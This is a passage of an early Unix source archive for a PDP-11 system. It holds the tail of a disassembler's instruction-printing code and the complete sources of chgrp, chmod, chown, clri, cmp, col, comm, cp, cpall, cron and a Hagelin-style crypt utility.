	register char *w;

	w = vallook(v);
	if (w > lim) {
		printf("%.1o", v);
		return;
	}
	printf("%.8s", ssymbol);
	if (w)
		printf("+%d", w);
}

#define	ISP	1
#define	DOUBLE	0
#define	SINGLE	1
#define	SINGLW	2
#define	MULDIV	4
#define	BRANCH	5
#define	NOADDR	6
#define	FLTREV	7
#define	FLTNOR	8
#define	SPECL1	9
#define	SPECL2	10
#define	SPECL3	11
#define	SPECL4	12
#define	SPECL5	13
#define	SPECL6	14
#define	SPECL7	15
#define	SPECL8	18
#define	SPECL9	19

struct optab {
	int	mask;
	int	val;
	int	itype;
	char	*iname;
} optab[] {
	0107777, 0010000, DOUBLE, "mov",
	0107777, 0020000, DOUBLE, "cmp",
	0107777, 0030000, DOUBLE, "bit",
	0107777, 0040000, DOUBLE, "bic",
	0107777, 0050000, DOUBLE, "bis",
	0007777, 0060000, DOUBLE, "add",
	0007777, 0160000, DOUBLE, "su",
	0100077, 0005000, SINGLE, "clr",
	0100077, 0005100, SINGLE, "com",
	0100077, 0005200, SINGLE, "inc",
	0100077, 0005300, SINGLE, "dec",
	0100077, 0005400, SINGLE, "neg",
	0100077, 0005500, SINGLE, "adc",
	0100077, 0005600, SINGLE, "sbc",
	0100077, 0005700, SINGLE, "tst",
	0100077, 0006000, SINGLE, "ror",
	0100077, 0006100, SINGLE, "rol",
	0100077, 0006200, SINGLE, "asr",
	0100077, 0006300, SINGLE, "asl",
	0000077, 0000100, SINGLE, "jmp",
	0000077, 0000300, SINGLE, "swab",
	0000077, 0170100, SINGLW, "ldfps",
	0000077, 0170200, SINGLW, "stfps",
	0000077, 0170300, SINGLW, "stst",
	0000077, 0170400, SINGLW, "clrf",
	0000077, 0170500, SINGLW, "tstf",
	0000077, 0170600, SINGLW, "absf",
	0000077, 0170700, SINGLW, "negf",
	0000077, 0006700, SINGLW, "sxt",
	0000077, 0006600, SINGLW, "mtpi",
	0000077, 0106600, SINGLW, "mtpd",
	0000077, 0006500, SINGLW, "mfpi",
	0000077, 0106500, SINGLW, "mfpd",
	0000777, 0070000, MULDIV, "mul",
	0000777, 0071000, MULDIV, "div",
	0000777, 0072000, MULDIV, "ash",
	0000777, 0073000, MULDIV, "ashc",
	0000377, 0000400, BRANCH, "br",
	0000377, 0001000, BRANCH, "bne",
	0000377, 0001400, BRANCH, "beq",
	0000377, 0002000, BRANCH, "bge",
	0000377, 0002400, BRANCH, "blt",
	0000377, 0003000, BRANCH, "bgt",
	0000377, 0003400, BRANCH, "ble",
	0000377, 0100000, BRANCH, "bpl",
	0000377, 0100400, BRANCH, "bmi",
	0000377, 0101000, BRANCH, "bhi",
	0000377, 0101400, BRANCH, "blos",
	0000377, 0102000, BRANCH, "bvc",
	0000377, 0102400, BRANCH, "bvs",
	0000377, 0103000, BRANCH, "bhis",
	0000377, 0103400, BRANCH, "blo",
	0000000, 0000000, NOADDR, "halt",
	0000000, 0000001, NOADDR, "wait",
	0000000, 0000002, NOADDR, "rti",
	0000000, 0000004, NOADDR, "iot",
	0000000, 0000005, NOADDR, "reset",
	0000377, 0171000, FLTREV, "mulf",
	0000377, 0171400, FLTREV, "modf",
	0000377, 0172000, FLTREV, "addf",
	0000377, 0172400, FLTREV, "movf",
	0000377, 0173000, FLTREV, "subf",
	0000377, 0173400, FLTREV, "cmpf",
	0000377, 0174000, FLTNOR, "movf",
	0000377, 0174400, FLTREV, "divf",
	0000377, 0175000, FLTNOR, "movei",
	0000377, 0175400, FLTNOR, "movfi",
	0000377, 0176000, FLTNOR, "movfo",
	0000377, 0176400, FLTREV, "movie",
	0000377, 0177000, FLTREV, "movif",
	0000377, 0177400, FLTREV, "movof",
	0000000, 0170000, NOADDR, "cfcc",
	0000000, 0170001, NOADDR, "setf",
	0000000, 0170002, NOADDR, "seti",
	0000000, 0170011, NOADDR, "setd",
	0000000, 0170012, NOADDR, "setl",
	0000777, 0004000, SPECL1, "jsr",
	0000777, 0074000, SPECL1, "xor",
	0000007, 0000200, SPECL2, "rts",
	0000017, 0000240, SPECL3, "cflg",
	0000017, 0000260, SPECL3, "sflg",
	0000377, 0104000, SPECL4, "emt",
	0000377, 0104400, SPECL5, "sys",
	0000077, 0006400, SPECL7, "mark",
	0000777, 0077000, SPECL8, "sob",
	0000007, 0000230, SPECL9, "spl",
	0177777, 0000000, SPECL6, "oct",
};

struct systab {
	int	argc;
	char	*sname;
} systab[] {
	1, "indir",
	0, "exit",
	0, "fork",
	2, "read",
	2, "write",
	2, "open",
	0, "close",
	0, "wait",
	2, "creat",
	2, "link",
	1, "unlink",
	2, "exec",
	1, "chdir",
	0, "time",
	3, "mknod",
	2, "chmod",
	2, "chown",
	1, "break",
	2, "stat",
	2, "seek",
	0, "getpid",
	3, "mount",
	1, "umount",
	0, "setuid",
	0, "getuid",
	0, "stime",
	3, "ptrace",
	0, "27",
	1, "fstat",
	0, "29",
	1, "smdate",
	1, "stty",
	1, "gtty",
	0, "33",
	0, "nice",
	0, "sleep",
	0, "sync",
	1, "kill",
	0, "switch",
	0, "39",
	0, "40",
	0, "dup",
	0, "pipe",
	1, "times",
	4, "profil",
	0, "45",
	0, "setgid",
	0, "getgid",
	2, "signal",
	0, "49",
	0, "50",
	0, "51",
	0, "52",
	0, "53",
	0, "54",
	0, "55",
	0, "56",
	0, "57",
	0, "58",
	0, "59",
	0, "60",
	0, "61",
	0, "62",
	0, "63",
};

char	*regname[] { "r0", "r1", "r2", "r3", "r4", "r5", "sp", "pc"};

printins(f)
{
	register ins, w;
	register struct optab *p;

	dotinc = 2;
	ins = cget(dot, ISP);
	if (vallook(dot)==0)
		printf("%.8s:", ssymbol);
	printf("\t");
	for (p=optab;; p++)
		if ((ins & ~p->mask) == p->val)
			break;
	printf("%s", p->iname);
	switch (p->itype) {

	/* rts */
	case SPECL2:
		ins =& 07;

	case SINGLE:
		if (ins < 0)
			printf("b");

	case SINGLW:
		printf("\t");
		paddr(ins);
		return;

	case FLTREV:
		ins =& 0377;

	case MULDIV:
		ins = ((ins>>6)&07) | ((ins<<6)&07700);
		goto doub;

	case FLTNOR:
		ins =& 0377;

	/* jsr, xor */
	case SPECL1:
		ins =& 0777;
		goto doub;

	case DOUBLE:
		if (ins<0)
			printf("b");
	doub:
		printf("\t");
		paddr(ins>>6);
		printf(",");
		paddr(ins);
		return;

	case NOADDR:
		return;

	/* sob */
	case SPECL8:
		printf("\t");
		paddr((ins>>6)&07);
		printf(",");
		ins = - (ins&077);
		goto bran;

	case BRANCH:
		printf("\t");
	bran:
		ins =& 0377;
		if (ins&0200)
			ins =| 0177400;
		ins = dot + (ins<<1) + 2;
		psymoff(ins, 010000);
		return;

	/* emt */
	case SPECL4:
		ins =& 0377;
	/* mark */
	case SPECL7:
		ins =& 077;
	/* spl */
	case SPECL9:
		ins =& 07;
		printf("\t%d", ins);
		return;

	/* sys */
	case SPECL5:
		printf("\t%s", systab[ins =& 077].sname);
		if (ins==0 && f==0) {	/* indir */
			w = dot;
			dot = cget(dot+2, ISP);
			printf(" {");
			printins(1);
			printf("}");
			dotinc = 4;
			dot = w;
			return;
		}
		w = systab[ins].argc;
		while (w--) {
			printf("; ");
			psymoff(cget(dot+dotinc, ISP), 010000);
			dotinc =+ 2;
		}
		return;

	default:
		printf("\t%.1o", ins);
	}
}

paddr(aa)
{
	register a, r;

	a = aa;
	r = a&07;
	a =& 070;
	if (r==7 && a&020) {
		if (a&010)
			printf("*");
		if (a&040)
			psymoff(cget(dot+dotinc, ISP)+dot+dotinc+2, 010000);
		else {
			printf("$");
			psymoff(cget(dot+dotinc, ISP), 010000);
		}
		dotinc =+ 2;
		return;
	}
	r = regname[r];
	switch (a) {
	/* r */
	case 000:
		printf("%s", r);
		return;

	/* (r) */
	case 010:
		printf("(%s)", r);
		return;

	/* *(r)+ */
	case 030:
		printf("*");

	/* (r)+ */
	case 020:
		printf("(%s)+", r);
		return;

	/* *-(r) */
	case 050:
		printf("*");

	/* -(r) */
	case 040:
		printf("-(%s)", r);
		return;

	/* *x(r) */
	case 070:
		printf("*");

	/* x(r) */
	case 060:
		psymoff(cget(dot+dotinc, ISP), 010000);
		dotinc =+ 2;
		printf("(%s)", r);
		return;
	}
}
-- /usr/source/s1/chgrp.s mode=0100664 uid=3 gid=3 atime=174922606 mtime=169260570 --
/ chgrp -- change group


	.globl	fopen, getc, mesg

	mov	sp,r5
	mov	(r5),r4
	cmp	r4,$3
	bge	1f
	jsr	r5,mesg; <chown uid f1 ...\n\0>; .even
1:
	add	$4,r5
	mov	(r5),r3
	cmpb	(r3),$'0
	blt	1f
	cmpb	(r3),$'9
	bgt	1f
	jsr	r5,cvnum; geta
	br	do
1:
	mov	$uids,r0
	jsr	r5,fopen; ubuf
	bec	1f
	jsr	r5,mesg; <Can't open /etc/uids\n\0>; .even
	sys	exit
1:
	mov	r3,r2
2:
	jsr	r5,getc; ubuf
	bcc	3f
who:
	jsr	r5,mesg; <Who?\n\0>; .even
	sys	exit
3:
	cmp	r0,$':
	beq	3f
	cmpb	(r2)+,r0
	beq	2b
2:
	jsr	r5,getc; ubuf
	bcs	who
	cmp	r0,$'\n
	bne	2b
	br	1b
3:
	tstb	(r2)
	bne	2b
3:
	jsr	r5,getc; ubuf
	cmpb	r0,$':
	bne	3b
	jsr	r5,cvnum; getc
do:
	sub	$2,r4
	swab	r1
	mov	r1,0f+2
	tst	(r5)+
1:
	mov	(r5),0f
	mov	(r5)+,9f
	sys	stat; 9:..; statb
	movb	statb+7,0f+2
	sys	chown; 0:..; 0
	bec	2f
	mov	0b,r0
	mov	r0,0f
	clr	0f+2
3:
	tstb	(r0)+
	beq	3f
	inc	0f+2
	br	3b
3:
	mov	$1,r0
	sys	write; 0:..; ..
	jsr	r5,mesg; <?\n\0>; .even
2:
	dec	r4
	bgt	1b
	sys	exit

cvnum:
	clr	r1
1:
	jsr	r5,*(r5); ubuf
	bcs	1f
	sub	$'0,r0
	cmp	r0,$9.
	bhi	1f
	mpy	$10.,r1
	add	r0,r1
	br	1b
1:
	tst	(r5)+
	rts	r5

geta:
	movb	(r3)+,r0
	tst	(r5)+
	rts	r5

uids:	</etc/group\0>

	.bss
statb:	.=.+36.
ubuf:	.=.+518.
-- /usr/source/s1/chmod.c mode=0100664 uid=3 gid=3 atime=174922612 mtime=169260570 --
main(argc, argv)
char **argv;
{
	register i, m;
	register char *c;
	int count;

	if(argc < 3) {
		printf("arg count\n");
		exit(1);
	}
	c = argv[1];
	m = 0;
	for(m=0; *c; c++) {
		if(*c < '0' || *c > '7') {
			printf("bad mode\n");
			exit(1);
		}
		m = (m<<3) | *c - '0';
	}
	for(i=2; i<argc; i++)
		if(chmod(argv[i], m) < 0) {
			count++;
			perror(argv[i]);
		}
	exit(count);
}
-- /usr/source/s1/chown.s mode=0100664 uid=3 gid=3 atime=174922621 mtime=169260570 --
/ chown -- change owner


	.globl	fopen, getc, mesg

	mov	sp,r5
	mov	(r5),r4
	cmp	r4,$3
	bge	1f
	jsr	r5,mesg; <chown uid f1 ...\n\0>; .even
1:
	add	$4,r5
	mov	(r5),r3
	cmpb	(r3),$'0
	blt	1f
	cmpb	(r3),$'9
	bgt	1f
	jsr	r5,cvnum; geta
	br	do
1:
	mov	$uids,r0
	jsr	r5,fopen; ubuf
	bec	1f
	jsr	r5,mesg; <Can't open /etc/uids\n\0>; .even
	sys	exit
1:
	mov	r3,r2
2:
	jsr	r5,getc; ubuf
	bcc	3f
who:
	jsr	r5,mesg; <Who?\n\0>; .even
	sys	exit
3:
	cmp	r0,$':
	beq	3f
	cmpb	(r2)+,r0
	beq	2b
2:
	jsr	r5,getc; ubuf
	bcs	who
	cmp	r0,$'\n
	bne	2b
	br	1b
3:
	tstb	(r2)
	bne	2b
3:
	jsr	r5,getc; ubuf
	cmpb	r0,$':
	bne	3b
	jsr	r5,cvnum; getc
do:
	sub	$2,r4
	mov	r1,0f+2
	tst	(r5)+
1:
	mov	(r5),0f
	mov	(r5)+,9f
	sys	stat; 9:..; statb
	movb	statb+8,0f+3
	sys	chown; 0:..; 0
	bec	2f
	mov	0b,r0
	mov	r0,0f
	clr	0f+2
3:
	tstb	(r0)+
	beq	3f
	inc	0f+2
	br	3b
3:
	mov	$1,r0
	sys	write; 0:..; ..
	jsr	r5,mesg; <?\n\0>; .even
2:
	dec	r4
	bgt	1b
	sys	exit

cvnum:
	clr	r1
1:
	jsr	r5,*(r5); ubuf
	bcs	1f
	sub	$'0,r0
	cmp	r0,$9.
	bhi	1f
	mpy	$10.,r1
	add	r0,r1
	br	1b
1:
	tst	(r5)+
	rts	r5

geta:
	movb	(r3)+,r0
	tst	(r5)+
	rts	r5

uids:	</etc/passwd\0>

	.bss
statb:	.=.+36.
ubuf:	.=.+518.
-- /usr/source/s1/clri.s mode=0100664 uid=3 gid=3 atime=174922626 mtime=169260570 --
/ clri -- clear inode

	cmp	(sp)+,$2
	blt	error
	beq	1f
	mov	4(sp),fs1
	mov	4(sp),fs2
1:
	tst	(sp)+
	mov	(sp)+,r0
	clr	r5
1:
	movb	(r0)+,r1
	beq	1f
	mpy	$10.,r5
	sub	$'0,r1
	cmp	r1,$10.
	bhis	error
	add	r1,r5
	br	1b
1:
	add	$31.,r5
	mov	r5,r0
	als	$-4,r0
	mov	r0,0f
	sys	open; fs1: filsys; 0
	bes	error
	mov	r0,-(sp)
	sys	seek; 0:..; 3
	mov	(sp),r0
	sys	read; buf; 512.
	mov	(sp)+,r0
	sys	close
	mov	r5,r0
	als	$5,r0
	bic	$!777,r0
	add	$buf,r0
	mov	$16.,r5
1:
	clr	(r0)+
	sob	r5,1b
	sys	open; fs2: filsys; 1
	bes	error
	mov	r0,-(sp)
	mov	0b,0f
	sys	seek; 0:..; 3
	mov	(sp)+,r0
	sys	write; buf; 512.
	bes	error
	sys	exit

error:
	mov	$1,r0
	sys	write; 1f; 2f-1f
	sys	exit
1:
	<error\n>
2:

filsys:	</dev/junk\0>
.even
	.bss
buf:	.=.+512.
-- /usr/source/s1/cmp.c mode=0100664 uid=3 gid=3 atime=174922630 mtime=169260570 --
int	ibuf1[259];
int	ibuf2[259];
int	eflg;
int	lflg	1;
int	line[2]	{0, 1};
int	chr[2] { -1, -1};

main(argc, argv)
char **argv;
{
	register c1, c2;
	char *arg;

	if(argc < 3)
		goto narg;
	arg = argv[1];
	if(arg[0] == '-' && arg[1] == 's') {
		lflg--;
		argv++;
		argc--;
	}
	arg = argv[1];
	if(arg[0] == '-' && arg[1] == 'l') {
		lflg++;
		argv++;
		argc--;
	}
	if(argc < 3)
		goto narg;
	arg = argv[1];
	if( arg[0]=='-' && arg[1]==0 )
		ibuf1[0] = dup(0);
	else if(fopen(arg, ibuf1) < 0)
		goto barg;
	arg = argv[2];
	if(fopen(arg, ibuf2) < 0)
		goto barg;

loop:
	if (++chr[1]==0)
		chr[0]++;
	c1 = getc(ibuf1);
	c2 = getc(ibuf2);
	if(c1 == c2) {
		if (c1 == '\n')
			if (++line[1]==0)
				line[0]++;
		if(c1 == -1) {
			if(eflg)
				exit(1);
			exit(0);
		}
		goto loop;
	}
	if(lflg == 0)
		exit(1);
	if(c1 == -1) {
		arg = argv[1];
		goto earg;
	}
	if(c2 == -1)
		goto earg;
	if(lflg == 1) {
		printf("%s %s differ: char %s, line ", argv[1], arg,
			locv(chr[0], chr[1]));
		printf("%s\n", locv(line[0], line[1]));
		exit(1);
	}
	eflg = 1;
	printf("%5s %3o %3o\n", locv(chr[0], chr[1]), c1, c2);
	goto loop;

narg:
	printf("arg count\n");
	exit(2);

barg:
	printf("cannot open %s\n", arg);
	exit(2);

earg:
	printf("EOF on %s\n", arg);
	exit(1);
}

putchar(c)
{

	write(1, &c, 1);
}
-- /usr/source/s1/col.c mode=0100664 uid=3 gid=3 atime=174922641 mtime=172642459 --
# define PL 102
# define ESC 033
# define SI 017
# define SO 016
# define LINELN 800
char *page[PL];
char lbuff [LINELN], *line;
main ()
{
int c, i, j, ll, cp, mustwr;
	extern int fin, fout;
	fin = dup(0);
	fout = dup(1);

for (ll=0; ll<PL; ll++)
	page[ll] = 0;

c = 1;
cp = ll = 0;
line = lbuff;
mustwr = PL;

while (c>0)
	switch (c = getchar())
		{
		case '\n':
			store (ll%PL);
			if (++ll >= mustwr)
				if (page[ll%PL] != 0)
					{
					printf ("%s\n",page[ll%PL]);
					mustwr++;
					free (page[ll%PL]);
					page[ll%PL]=0;
					}
			fetch (ll%PL);
			cp = 0;
			continue;
		case '\0': continue;
		case ESC:
			c = getchar();
			if (c == '7')
				{
				store(ll%PL);
				ll--;
				fetch (ll%PL);
				}
			else
				{
				outc (ESC, &line);
				outc (c, &line );
				}
			continue;
		case '\r':
			line = lbuff;
			continue;
		case '\t':
			outc (' ', &line);
			cp = line-lbuff;
			while (cp++%8)
				outc(' ', &line);
			continue;
		default:
			outc(c, &line);
		}
for (i=0; i<PL; i++)
   if (page[(mustwr+i)%PL] != 0)
	printf ("%s\n",page[(mustwr+i) % PL]);
flush();
}
outc (c, lp)
	char **lp;
{
int j;
j = 0;
while (j >0 || *(*lp) == '\b' || *(*lp) == ESC || **lp == SI || **lp == SO)
	{
	switch (*(*lp))
		{
		case '\b':
			j++;
			(*lp)++;
			break;
		case '\0':
			*(*lp)++ = ' ';
			j--;
			break;
		case ESC: /* 'escape' */
			(*lp) =+ 2;
			break;
		case SI:
		case SO:
			(*lp)++;
			break;
		default:
			(*lp)++;
			j--;
			break;
		}
	}
if (c != ' ' || *(*lp) == '\0')
	*(*lp) = c;
(*lp)++;
}
store (ll)
{
if (page[ll] != 0)
	free (page[ll]);
page[ll] = alloc ( leng (lbuff) + 2);
copy (page[ll],lbuff);
}
fetch(ll)
{
int i;
for (i=0; i < LINELN; i++)
 lbuff[i] = '\0';
copy (line=lbuff, page[ll]);
}
copy (s,t)
	char *s, *t;
{
if (t == 0)
	return (*s=0);
while (*s++ = *t++);
}
leng (s)
	char *s;
{
int l;
for (l=0; s[l]; l++);
return (l);
}
-- /usr/source/s1/comm.c mode=0100664 uid=3 gid=3 atime=174922655 mtime=169260570 --
#define LB 250
int	one;
int	two;
int	three;

char	*ldr[3];

char	ib1[518];
char	ib2[518];
main(argc,argv)
	char	*argv[];
{
	extern	fout;
	int	l;
	char	lb1[LB],lb2[80];

	ldr[0] = "";
	ldr[1] = "\t";
	ldr[2] = "\t\t";
	if(argc > 1)  {
		if(*argv[1] == '-' && argv[1][1] != 0) {
			l = 1;
			while(*++argv[1]) {
				switch(*argv[1]) {
				case'1':
					if(!one) {
						one = 1;
						ldr[1][0] =
						ldr[2][l--] = '\0';
					}
					break;
				case '2':
					if(!two) {
						two = 1;
						ldr[2][l--] = '\0';
					}
					break;
				case '3':
					three = 1;
					break;
				default:
				printf("Illegal flag: %c\n",*argv[1]);
				exit();
				}
			}
			argv++;
			argc--;
		}
	}

	if(argc < 3) {
		printf("Argc = %d\n",argc);
		exit();
	}

	openfil(argv[1],ib1);
	openfil(argv[2],ib2);
	fout = dup(1);


	if(rd(ib1,lb1) < 0) {
		if(rd(ib2,lb2) < 0)	exit();
		copy(ib2,lb2,2);
	}
	if(rd(ib2,lb2) < 0)	copy(ib1,lb1,1);

	while(1) {

		switch(compare(lb1,lb2)) {

			case 0:
				wr(lb1,3);
				if(rd(ib1,lb1) < 0) {
					if(rd(ib2,lb2) < 0)	fexit();
					copy(ib2,lb2,2);
				}
				if(rd(ib2,lb2) < 0)	copy(ib1,lb1,1);
				continue;

			case 1:
				wr(lb1,1);
				if(rd(ib1,lb1) < 0)	copy(ib2,lb2,2);
				continue;

			case 2:
				wr(lb2,2);
				if(rd(ib2,lb2) < 0)	copy(ib1,lb1,1);
				continue;
		}
	}
}

rd(file,buf)
	char	*buf;
{

	register int i;
	i = 0;
	while((*buf = getc(file)) >=0) {
		if(*buf == '\n' || i > LB-2) {
			*buf = '\0';
			return(0);
		}
		i++;
		buf++;
	}
	return(-1);
}

wr(str,n)
	char	*str;
{

	switch(n) {

		case 1:
			if(one)	return;
			break;

		case 2:
			if(two)	return;
			break;

		case 3:
			if(three)	return;
	}
	printf("%s%s\n",ldr[n-1],str);
}

copy(ibuf,lbuf,n)
{
	do {
		wr(lbuf,n);
	} while(rd(ibuf,lbuf) >= 0);

	flush();
	exit();
}

compare(a,b)
	char	*a,*b;
{
	register char *ra,*rb;

	ra = --a;
	rb = --b;
	while(*++ra == *++rb)
		if(*ra == '\0')	return(0);
	if(*ra < *rb)	return(1);
	return(2);
}
fexit()
{
	flush();
	exit();
}

openfil(s,b)
char *s;
int *b;
{
	if(s[0]=='-' && s[1]==0)
		b[0] = 0;
	else if(fopen(s, b) == -1) {
		printf("Can't open %s\n", s);
		exit(1);
	}
}
-- /usr/source/s1/cp.c mode=0100664 uid=3 gid=3 atime=174922669 mtime=169260570 --
/*
 * cp oldfile newfile
 */

main(argc,argv)
char **argv;
{
	static int buf[256];
	int fold, fnew, n;
	register char *p1, *p2, *bp;
	int mode;

	if(argc != 3) {
		write(1, "Usage: cp oldfile newfile\n", 26);
		exit(1);
	}
	if((fold = open(argv[1], 0)) < 0) {
		write(1, "Cannot open old file.\n", 22);
		exit(1);
	}
	fstat(fold, buf);
	mode = buf[2];
	/* is target a directory? */
	if (stat(argv[2], buf+50)>=0 && (buf[52]&060000)==040000) {
		p1 = argv[1];
		p2 = argv[2];
		bp = buf+100;
		while(*bp++ = *p2++);
		bp[-1] = '/';
		p2 = bp;
		while(*bp = *p1++)
			if(*bp++ == '/')
				bp = p2;
		argv[2] = buf+100;
	}
	if (stat(argv[2], buf+50) >= 0) {
		if (buf[0]==buf[50] && buf[1]==buf[51]) {
			write(1, "Copying file to itself.\n", 24);
			exit(1);
		}
	}
	if ((fnew = creat(argv[2], mode)) < 0) {
		write(1, "Can't create new file.\n", 23);
		exit(1);
	}
	while(n = read(fold,  buf,  512)) {
	if(n < 0) {
		write(1, "Read error\n", 11);
		exit(1);
	} else
		if(write(fnew, buf, n) != n){
			write(1, "Write error.\n", 13);
			exit(1);
		}
	}
	exit(0);
}
-- /usr/source/s1/cpall.c mode=0100664 uid=3 gid=3 atime=174922680 mtime=169260570 --
char	buf[100];

main(argc, argv)
char **argv;
{
	register i;
	register char *c1, *c2;

	if(argc < 3) {
		write(2, "arg count\n", 10);
		exit();
	}
	argc--;
	c1 = buf;
	c2 = argv[argc];
	while(*c1++ = *c2++);
	c1[-1] = '/';
	*c1++ = '.';
	*c1 = '\0';
	for(i=1; i<argc; i++) {
		if(fork()==0) {
			execl("/bin/cp", "cp", argv[i], buf);
			exit();
		}
		wait();
	}
}
-- /usr/source/s1/cron.c mode=0100664 uid=3 gid=3 atime=174922689 mtime=169260570 --
#define	ANY	-1
#define	LIST	-2
#define	RANGE	-3
#define	EOF	-4
char	*crontab	"/usr/lib/crontab";
char	*crontmp	"/tmp/crontmp";
char	*aend;
char	*itime[2];
int	*loct;
int	*localtime();
int	reset();
int	flag;

main()
{
	register i, t;
	register char *cp;
	extern char end[];

	setuid(1);
	itime[0] = fork();
	if(itime[0])
		exit();
	setexit();
	signal(1, reset);
	time(itime);
	while(*localtime(itime))
		if(itime[1]-- == 0)
			itime[0]--;

loop:
	init();
	for(i=60; i; i--) {
		loct = localtime(itime);
		for(cp = end; *cp != EOF;) {
			flag = 0;
			cp = cmp(cp, loct[1]); /* minute */
			cp = cmp(cp, loct[2]); /* hour */
			cp = cmp(cp, loct[3]); /* day */
			cp = cmp(cp, loct[4]); /* month */
			cp = cmp(cp, loct[6]); /* day of week */
			if(flag == 0) {
				slp();
				ex(cp);
			}
			while(*cp++ != 0)
				;
		}
		t = itime[1] + 60;
		if(t < itime[1])
			itime[0]++;
		itime[1] = t;
	}
	slp();
	goto loop;
}

cmp(p, v)
char *p;
{
	register char *cp;

	cp = p;
	switch(*cp++) {

	case ANY:
		return(cp);

	case LIST:
		while(*cp != LIST)
			if(*cp++ == v) {
				while(*cp++ != LIST)
					;
				return(cp);
			}
		flag++;
		return(cp+1);

	case RANGE:
		if(*cp > v || cp[1] < v)
			flag++;
		return(cp+2);
	}
	if(cp[-1] != v)
		flag++;
	return(cp);
}

slp()
{
	register i;
	int	t[2];

	time(t);
	i = itime[1] - t[1];
	if(i > 0)
		sleep(i);
}

ex(s)
char *s;
{
	register i;

	if(fork()) {
		wait();
		return;
	}
	for(i=0; s[i]; i++);
	close(0);
	creat(crontmp, 0600);
	write(0, s, i);
	close(0);
	open(crontmp, 0);
	unlink(crontmp);
	if(fork())
		exit();
	execl("/bin/sh", "sh", "-t", 0);
	exit();
}

init()
{
	int ib[259], t[10];
	register i, c;
	register char *cp;
	char *ocp;
	int n;
	extern char end[];

	if(fopen(crontab, ib) < 0) {
		write(1, "cannot open table\n", 18);
		exit();
	}
	cp = end;
	if(aend == 0)
		aend = cp;

loop:
	ocp = cp;
	if(cp+100 > aend) {
		aend =+ 512;
		brk(aend);
	}
	for(i=0;; i++) {
		do
			c = getc(ib);
		while(c == ' ' || c == '\t');
		if(c <= 0 || c == '\n')
			goto ignore;
		if(i == 5)
			break;
		if(c == '*') {
			*cp++ = ANY;
			continue;
		}
		n = 0;
		while(c >= '0' && c <= '9') {
			n = n*10 + c-'0';
			c = getc(ib);
		}
		if(n < 0 || n > 100)
			goto ignore;
		if(c == ',')
			goto list;
		if(c == '-')
			goto range;
		if(c != '\t' && c != ' ')
			goto ignore;
		*cp++ = n;
		continue;

	list:
		*cp++ = LIST;
		*cp++ = n;
	list1:
		n = 0;
		c = getc(ib);
		while(c >= '0' && c <= '9') {
			n = n*10 + c-'0';
			c = getc(ib);
		}
		if(n < 0 || n > 100)
			goto ignore;
		*cp++ = n;
		if(c == ',')
			goto list1;
		if(c != '\t' && c != ' ')
			goto ignore;
		*cp++ = LIST;
		continue;

	range:
		*cp++ = RANGE;
		*cp++ = n;
		n = 0;
		c = getc(ib);
		while(c >= '0' && c <= '9') {
			n = n*10 + c-'0';
			c = getc(ib);
		}
		if(n < 0 || n > 100)
			goto ignore;
		if(c != '\t' && c != ' ')
			goto ignore;
		*cp++ = n;
	}
	while(c != '\n') {
		if(c <= 0)
			goto ignore;
		if(c == '%')
			c = '\n';
		*cp++ = c;
		c = getc(ib);
	}
	*cp++ = '\n';
	*cp++ = 0;
	goto loop;

ignore:
	cp = ocp;
	while(c != '\n') {
		if(c <= 0) {
			close(ib[0]);
			*cp++ = EOF;
			*cp++ = EOF;
			aend = cp;
			brk(aend);
			return;
		}
		c = getc(ib);
	}
	goto loop;
}
-- /usr/source/s1/crypt.c mode=0100664 uid=3 gid=3 atime=174922705 mtime=169260570 --
/*
This routine is an exact implementation of Boris Hagelin's
cryptographic machine.  See U. S. Patent #2,089,603.
*/

int	cagetable[] { 0, 1, 1, 2, 2, 3, 4, 4, 5, 6, 8, 8, 9, 10, 12, 16,
	16, 17, 18, 20, 24, 32, 32, 33, 34, 36, 40, 48};
int	warr1[52];
int	warr2[50];
int	warr3[46];
int	warr4[42];
int	warr5[38];
int	warr6[34];
int	*wheel1 warr1;
int	*wheel2 warr2;
int	*wheel3 warr3;
int	*wheel4 warr4;
int	*wheel5 warr5;
int	*wheel6 warr6;
char	key[130];
int	xxx;


/*
subroutine to manufacture a wheel
*/

setup(list,n) int list[];
	{int *lp;
	lp = list;
	while(--n){
		*lp = lp+2;
		lp[1] = getbit();
		if(xxx) putchar(lp[1]+'0');
		lp = lp + 2;
		}
	*lp = list;
	lp[1] = getbit();
	if(xxx){
		putchar(lp[1]+'0');
		putchar('\n');
		}
	}



/*
subroutine to return the next bit from the main routines
argument
*/

getbit(){
	static i,j;
	int b;
	b = (key[j] >> i) & 1;
	if (i++ > 5) {
		j++;
		i = 0;
		}
	return (b);
	}




main(ncooky,cookyp)
	int ncooky;
	char *cookyp[];
	{
	char *ip, *jp;
	int temp;
	int random;
	int i,j;
	int precious;
	int crypt;
	int cage[27];
	xxx = 0;



/*
copy input key and pad with clever junk
*/

	jp = key;
	*jp++ = 004;
	*jp++ = 034;
	if(ncooky > 1){
		while (*jp++ = *cookyp[1]++);
		jp--;
		}
	ip = key;
	while (jp < key+128) {
		*jp = jp[-1] ^ *ip++;
		jp++;
	}


/*
manufacture six wheels of various length
*/

	setup(wheel1,26);
	setup(wheel2,25);
	setup(wheel3,23);
	setup(wheel4,21);
	setup(wheel5,19);
	setup(wheel6,17);

/*
set up the cage bars from the key area
*/

	jp = key;
	i = 27;
	while (i--){
	cage[i] = cagetable[*jp++ % 28];
	if(xxx && (cage[i] != 0)){
		putchar( cage[i]/8 + '0');
		putchar( cage[i]%8 + '0');
		putchar(' ');
		}
	}
	if(xxx) putchar('\n');


/*
the internal settings are now complete
it's time to turn the crank, running the cage
bars against the wheel lugs.
*/


while ((precious = getchar()) >=0){
	temp = 040*wheel1[1] + 020*wheel2[1] + 010*wheel3[1]
		+ 004*wheel4[1] + 002*wheel5[1] + 001*wheel6[1];
	wheel1 = *wheel1;
	wheel2 = *wheel2;
	wheel3 = *wheel3;
	wheel4 = *wheel4;
	wheel5 = *wheel5;
	wheel6 = *wheel6;

	random = 0;
	i = 27;
	while (i--){
		random = random + ((temp & cage[i]) != 0);
		}
	random =% 26;

/*
now we have a random number to use to encrypt the input
it is done in such a way that the process is its own
inverse.
*/


	if ( precious=='\n' || precious==' ')
		crypt = precious;
	else{
		crypt = ('a' + 'z' - precious + random)%0400;
		if (crypt >= 'a' && crypt <= 'z' && precious > 'z')
			crypt =+ 26;
		if (crypt > 'z' && precious >= 'a' & precious <= 'z')
			crypt =- 26;
		if (crypt == '\n' || crypt == ' ')
			crypt = precious;
		}
	putchar(crypt);
	}
flush();
return;
}

char	ibuf[512];
char	obuf[512];
char	*ibufp;
int	icnt;
int	ocnt;
getchar()
{

	if(icnt == 0) {
		icnt = read(0, ibuf, 512);
